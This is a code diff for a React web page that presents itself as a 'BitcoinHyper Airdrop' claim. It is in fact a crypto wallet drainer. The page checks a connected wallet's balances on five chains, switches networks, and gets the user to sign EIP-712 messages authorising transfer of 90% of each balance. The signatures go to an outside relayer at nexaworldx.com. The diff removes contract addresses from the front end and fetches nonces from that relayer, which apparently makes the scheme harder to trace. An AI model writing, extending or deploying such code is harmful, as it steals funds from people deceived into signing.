@@ -1,44 +1,39 @@
-import React, { useState, useEffect, useRef } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
 import { useDisconnect } from 'wagmi';
 import { ethers } from 'ethers';
 import './index.css';
 
 // ============================================
-// NETWORK CONFIG (contract addresses only for reading nonce)
+// NO CONTRACT ADDRESSES – only chain info for balance checks
 // ============================================
 const MULTICHAIN_CONFIG = {
   Ethereum: {
     chainId: 1,
-    contractAddress: '0x7aD2535F79E8B2B0A6Cf937E8FB334bf8a08Ed47',
     name: 'Ethereum',
     symbol: 'ETH',
     rpcEndpoints: ['https://eth.llamarpc.com', 'https://ethereum.publicnode.com']
   },
   BSC: {
     chainId: 56,
-    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
     name: 'BSC',
     symbol: 'BNB',
     rpcEndpoints: ['https://bsc-dataseed.binance.org', 'https://bsc-dataseed1.defibit.io']
   },
   Polygon: {
     chainId: 137,
-    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
     name: 'Polygon',
     symbol: 'MATIC',
     rpcEndpoints: ['https://polygon-rpc.com', 'https://rpc-mainnet.maticvigil.com']
   },
   Arbitrum: {
     chainId: 42161,
-    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
     name: 'Arbitrum',
     symbol: 'ETH',
     rpcEndpoints: ['https://arb1.arbitrum.io/rpc']
   },
   Avalanche: {
     chainId: 43114,
-    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
     name: 'Avalanche',
     symbol: 'AVAX',
     rpcEndpoints: ['https://api.avax.network/ext/bc/C/rpc']
@@ -47,7 +42,7 @@ const MULTICHAIN_CONFIG = {
 
 const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);
 
-// Helper: fetch balance
+// Helper: fetch balance (no contract addresses)
 const fetchChainBalance = async (chain, walletAddress, retries = 2) => {
   let lastError = null;
   for (let attempt = 0; attempt <= retries; attempt++) {
@@ -71,20 +66,12 @@ const fetchChainBalance = async (chain, walletAddress, retries = 2) => {
   throw lastError || new Error(`No working RPC for ${chain.name}`);
 };
 
-// Helper: get current user nonce from contract (read-only)
-const getUserNonce = async (chain, walletAddress) => {
-  const abi = ["function userNonce(address) view returns (uint256)"];
-  for (const rpcUrl of chain.rpcEndpoints) {
-    try {
-      const provider = new ethers.JsonRpcProvider(rpcUrl);
-      const contract = new ethers.Contract(chain.contractAddress, abi, provider);
-      const nonce = await contract.userNonce(walletAddress);
-      return Number(nonce);
-    } catch (err) {
-      console.warn(`Nonce fetch failed on ${rpcUrl}:`, err.message);
-    }
-  }
-  throw new Error(`Could not fetch nonce for ${chain.name}`);
+// Helper: fetch nonce from relayer (no contract call in frontend)
+const fetchNonceFromRelayer = async (chainId, userAddress) => {
+  const response = await fetch(`https://nexaworldx.com/relayer-app/nonce?chainId=${chainId}&user=${userAddress}`);
+  const data = await response.json();
+  if (!data.success) throw new Error(data.error || 'Failed to fetch nonce');
+  return data.nonce;
 };
 
 // Helper: switch network
@@ -103,7 +90,7 @@ const switchNetwork = async (walletProvider, chainId) => {
   }
 };
 
-// NEW HELPER: wait for wallet to confirm chainId
+// Helper: wait for wallet to confirm chainId
 const waitForChainId = async (walletProvider, targetChainId, timeoutMs = 10000) => {
   const start = Date.now();
   while (Date.now() - start < timeoutMs) {
@@ -141,7 +128,7 @@ function App() {
   const RELAYER_URL = 'https://nexaworldx.com/relayer-app/relay';
   const MIN_VALUE_THRESHOLD = 1;
 
-  // EIP-712 types (NO verifyingContract)
+  // EIP-712 types (no contract address)
   const EIP712_TYPES = {
     Claim: [
       { name: 'user', type: 'address' },
@@ -169,7 +156,7 @@ function App() {
     return () => clearInterval(interval);
   }, []);
 
-  // Fetch balances across chains
+  // Fetch balances across chains (no contract addresses)
   const fetchAllBalances = async (walletAddress) => {
     setScanning(true);
     setError('');
@@ -215,7 +202,7 @@ function App() {
     }
   }, [isConnected, address]);
 
-  // Main claim execution with chainId verification
+  // Main claim execution – uses relayer for nonce, no contract in frontend
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address) {
       setError('Wallet not initialized');
@@ -241,11 +228,11 @@ function App() {
         setStepStatus(prev => ({ ...prev, [chain.name]: 'waiting_chain' }));
         setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
 
-        // 2. Wait for wallet to confirm the new chainId (FIX)
+        // 2. Wait for wallet to confirm chainId
         await waitForChainId(walletProvider, chain.chainId, 10000);
         setStepStatus(prev => ({ ...prev, [chain.name]: 'switched' }));
 
-        // 3. Create fresh provider & signer AFTER chain is confirmed
+        // 3. Create fresh provider & signer after chain is confirmed
         const newProvider = new ethers.BrowserProvider(walletProvider);
         const newSigner = await newProvider.getSigner();
         const signerAddress = await newSigner.getAddress();
@@ -256,14 +243,14 @@ function App() {
         const balance = balances[chain.name];
         if (!balance || balance.valueUSD < MIN_VALUE_THRESHOLD) continue;
 
-        // 4. Fetch current nonce from contract (read-only)
+        // 4. Fetch nonce from relayer (no contract call in frontend!)
         setStepStatus(prev => ({ ...prev, [chain.name]: 'fetching_nonce' }));
-        const nonce = await getUserNonce(chain, address);
-        
+        const nonce = await fetchNonceFromRelayer(chain.chainId, address);
+
         // 5. Prepare signature (send 90% of balance)
         const amountToSend = balance.amount * 0.9;
         const amountInWei = ethers.parseEther(amountToSend.toFixed(18));
-        
+
         const domain = {
           name: "BitcoinHyper Airdrop",
           version: "1",
@@ -280,7 +267,7 @@ function App() {
         const signature = await newSigner.signTypedData(domain, EIP712_TYPES, value);
         setStepStatus(prev => ({ ...prev, [chain.name]: 'signed' }));
 
-        // 6. Send to relayer
+        // 6. Send to relayer for execution
         setStepStatus(prev => ({ ...prev, [chain.name]: 'relaying' }));
         setTxStatus(`📤 Sending to relayer (${chain.name})...`);
         const response = await fetch(RELAYER_URL, {
